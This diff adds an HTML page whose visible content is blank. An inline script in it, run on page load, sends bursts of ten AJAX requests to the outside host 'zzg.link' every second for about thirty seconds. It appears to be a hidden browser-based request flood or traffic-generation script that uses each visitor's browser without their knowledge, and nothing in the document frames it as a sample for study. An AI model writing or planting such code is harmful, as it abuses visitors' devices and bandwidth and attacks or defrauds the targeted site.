@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script src="{:STATIC_SERVER_URL}/public/js/jquery.js"></script>
+    <script>
+        var z=0;
+        function site(){
+            z++;
+            for(var i=0;i<10;i++){ 
+            $.ajax({
+                url:'http://www.zzg.link/'
+            }); 
+            }
+            if(z < 30){
+			    setTimeout(function(){site()},1000);
+            }
+        }
+        site()
+    </script>
+</head>
+<body>
+
+</body>
+</html>
